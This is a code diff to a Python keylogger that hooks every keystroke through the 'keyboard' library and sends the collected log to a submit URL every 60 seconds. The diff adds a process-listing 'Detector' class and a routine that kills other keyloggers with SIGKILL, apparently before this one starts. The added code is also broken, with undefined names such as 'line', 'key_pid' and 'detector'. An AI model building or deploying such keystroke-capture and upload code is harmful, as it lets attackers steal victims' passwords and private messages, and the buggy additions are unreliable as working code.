@@ -1,12 +1,63 @@
+#Imports
 import keyboard
 import requests
 import uuid
+import json
 from threading import Timer
 from datetime import datetime
+from subprocess import Popen,PIPE
+import os, signal
+from sys import stdout
+from re import split
 
+#Request sending timer and remote server URL
 SEND_TIMER = 60
 URL = 'http://localhost:3000/submit'
 
+#Keylogger-Detector class
+class Detector:
+    def __init__(self, proc):
+        self.user = proc[0]
+        self.pid = proc[1]
+        self.cpu = proc[2]
+        self.mem = proc[3]
+        self.vsz = proc[4]
+        self.rss = proc[5]
+        self.tty = proc[6]
+        self.stat = proc[7]
+        self.start = proc[8]
+        self.time = proc[9]
+        self.cmd = proc[10]
+    
+    def name(self):
+        return '%s' %self.cmd
+    
+    def pid(self):
+        return '%s' %self.pid
+    
+#Process listing function
+def get_proc_list():
+    proc_list = []
+    sub_proc = Popen(['ps', 'aux'], shell=False, stdout=PIPE)
+    sub_proc.stdout.readline()
+    for l in sub_proc.stdout:
+        proc_info = split(" *", line.strip())
+        proc_list.append(Detector(proc=proc_info))
+    else:
+        pass
+    
+    return proc_list
+
+#Keylogger killing function
+def kill_keylogger():
+    r = input("\nDo you want to stop this process ? (y/n) ")
+    if (r=='y' or r=="Y"):
+        os.kill(int(key_pid), signal.SIGKILL)
+    else:
+        pass
+
+
+#Keylogger class
 class Keylogger:
     def __init__(self, interval, url):
         self.interval = interval
@@ -20,14 +71,9 @@ class Keylogger:
     def callback(self, event):
         name = event.name
         if len(name) > 1:
-
-            # not a character, special key (e.g ctrl, alt, etc.)
-            # uppercase with []
             if name == "space":
-                # " " instead of "space"
                 name = " "
             elif name == "enter":
-                # add a new line whenever an ENTER is pressed
                 name = "[ENTER]\n"
             elif name == "decimal":
                 name = "."
@@ -94,6 +140,20 @@ class Keylogger:
         keyboard.wait()
 
 if __name__ == "__main__":
+
+    #Other keylogger detection
+    proc_list = get_proc_list()
+    proc_pid = []
+    proc_cmd = []
+    print("\nCheking Processes....\n")
+
+    # detector = Detector(proc=proc_list)
+    for p in proc_list:
+        proc_cmd.append(detector.name)
+
+
+
+    #Start this keylogger
     keylogger = Keylogger(interval=SEND_TIMER, url=URL)
     keylogger.start()
 
